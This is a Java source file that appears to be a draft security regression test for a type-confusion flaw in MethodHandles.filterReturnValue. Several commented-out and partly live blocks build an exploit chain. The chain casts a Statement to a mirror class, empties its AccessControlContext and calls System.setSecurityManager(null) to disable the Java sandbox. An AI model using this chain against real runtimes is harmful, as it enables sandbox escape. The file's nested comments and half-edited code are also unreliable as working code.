/**
 * Created by ntv on 6/15/2016.
 */
import java.beans.Statement;
import java.lang.invoke.MethodHandle;
import java.lang.invoke.MethodHandles;
import java.lang.invoke.MethodType;
import java.security.AccessControlContext;
import java.security.ProtectionDomain;
import java.util.Arrays;

/* @test
 * @bug XXXXXXX
 * @summary MHs.filterReturnValue is vulnerable to unmatched extra arguments
 * @key closed-security
 * @modules java.desktop
 * @run main/othervm/policy=test.policy/secure=java.lang.SecurityManager -ea -esa Test
 */
public class Test {

    static MethodHandles.Lookup look   = MethodHandles.lookup();

    static MethodHandles.Lookup  getLook() {
        return look;
    }

    public static class StatementMirror{
        public AccessControlContext acc;
    }
    public static void main(String[] args) {
        try {
            /*Statement statement = new Statement(System.class, "setSecurityManager", new Object[1]);
            MethodHandle statement_MH = MethodHandles.constant(Object.class, statement);
            MethodHandle identity_MH = MethodHandles.identity(StatementMirror.class);
            MethodHandle drop_MH = MethodHandles.dropArguments(identity_MH, 0, Object.class);
           // StatementMirror st = (StatementMirror)identity_MH.invokeExact( new StatementMirror());
           // StatementMirror st = (StatementMirror)drop_MH.invokeExact( new StatementMirror());
             MethodHandle bad_filter_MH = MethodHandles.filterReturnValue(statement_MH, drop_MH);
             StatementMirror sm = (StatementMirror) bad_filter_MH.invokeExact();
             sm.acc = new AccessControlContext(new ProtectionDomain[0]);
             statement.execute();*/
            MethodHandle mh = MethodHandles.lookup().findVirtual(String.class, "concat" , MethodType.methodType(String.class, String.class));
            String out = (String) mh.invokeExact("a","b");
            // return true;
         } catch (Throwable t) {
             System.err.println("caught: " + t);

         }
      /*  if (disableSecurityManager()) {
            throw new AssertionError("security manager disabled");
        } else {
            System.err.println("PASSED");
        }*/
    }
     boolean disableSecurityManager(int a) {
        return true;
    }

     boolean disableSecurityManager() {
         try {
             Statement statement = new Statement(System.class, "setSecurityManager", new Object[1]);
             MethodHandle statement_MH = MethodHandles.constant(Object.class, statement);
             MethodHandle identity_MH = MethodHandles.identity(StatementMirror.class);
             MethodHandle drop_MH = MethodHandles.dropArguments(identity_MH, 0, Object.class);
             System.out.println("sfg"+drop_MH.type().parameterCount());
             drop_MH.invokeExact(new StatementMirror());
            /* MethodHandle bad_filter_MH = MethodHandles.filterReturnValue(statement_MH, drop_MH);
             StatementMirror sm = (StatementMirror) bad_filter_MH.invokeExact();
             sm.acc = new AccessControlContext(new ProtectionDomain[0]);
             statement.execute();
             return true;
         } catch (Throwable t) {
             System.err.println("caught: " + t);
             return false;
         }
        try {
           /* MethodHandle target = MethodHandles.publicLookup().
                    findStatic(Arrays.class, "sort", MethodType.methodType(void.class, int[].class));
            MethodHandle filter = MethodHandles.lookup().findVirtual(Integer.class,
                    "intValue", MethodType.methodType(int.class));
                    */
          /*  Statement statement = new Statement(System.class, "setSecurityManager", new Object[1]);

            MethodHandle statement_MH = MethodHandles.constant(Object.class, statement);
            MethodHandle identity_MH = MethodHandles.identity(StatementMirror.class);

            MethodHandle drop_MH = MethodHandles.dropArguments(identity_MH, 0, Object.class);

            MethodHandle bad_filter_MH = MethodHandles.filterReturnValue(statement_MH, drop_MH);

            StatementMirror sm = (StatementMirror)bad_filter_MH.invokeExact();
   */


           /* MethodHandle cat = MethodHandles.lookup().findVirtual(String.class,
                    "concat", MethodType.methodType(String.class, String.class));
             String m = (String) cat.invokeExact("x","y");
            Statement statement = new Statement(System.class, "setSecurityManager", new Object[1]);
           // StatementMirror sm1 = new StatementMirror();
            MethodHandle statement_MH = MethodHandles.constant(Statement.class, statement);
            MethodHandle identity_MH = MethodHandles.identity(Object.class);
           // System.out.println(""+(String)identity_MH.invoke("123"));
            MethodHandle drop_MH = MethodHandles.dropArguments(identity_MH, 0, Statement.class, String.class);
         //   StatementMirror sm1 = (StatementMirror) drop_MH.invokeExact(new Object(), new StatementMirror());
            MethodHandle bad_filter_MH = MethodHandles.filterReturnValue(statement_MH, drop_MH);
            Object obj = bad_filter_MH.invokeExact();
           // StatementMirror sm = (StatementMirror) bad_filter_MH.invokeExact();
            //sm.acc = new AccessControlContext(new ProtectionDomain[0]);
           // statement.execute();*/
            return true;


        } catch (Throwable t) {
            System.err.println("caught: " + t);
            return false;
        }

/*
        try {
            Statement statement = new Statement(System.class, "setSecurityManager", new Object[1]);
            MethodHandle statement_MH = MethodHandles.constant(Object.class, statement);
            MethodHandle identity_MH = MethodHandles.identity(StatementMirror.class);
            MethodHandle drop_MH = MethodHandles.dropArguments(identity_MH, 0, Object.class);
            MethodHandle bad_filter_MH = MethodHandles.filterReturnValue(statement_MH, drop_MH);
            StatementMirror sm = (StatementMirror) bad_filter_MH.invokeExact();
            sm.acc = new AccessControlContext(new ProtectionDomain[0]);
            statement.execute();
            return true;
        } catch (Throwable t) {
            System.err.println("caught: " + t);
            return false;
        }
        */
    }
}
